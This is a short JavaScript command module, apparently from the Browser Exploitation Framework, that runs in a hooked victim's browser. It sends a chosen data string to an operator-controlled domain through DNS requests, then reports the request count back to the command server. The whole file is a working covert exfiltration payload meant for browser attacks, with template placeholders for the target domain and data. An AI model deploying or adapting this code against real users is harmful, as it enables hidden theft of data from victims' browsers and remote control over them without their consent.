//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
Check the Browser Hacker's Handbook, chapter 3, pages 89-95 for more details about how this works.
*/

server.execute(function() {

	var msgId   = "<%= @command_id %>";
	var domain  = "<%= @domain %>";
	var data = "<%= @data %>";
                                                    //chunks comes from the callback
	server.net.dns.send(msgId, data, domain, function(chunks){
          server.net.send('<%= @command_url %>', <%= @command_id %>, 'dns_requests='+chunks+' requests sent');
        }
    );

});

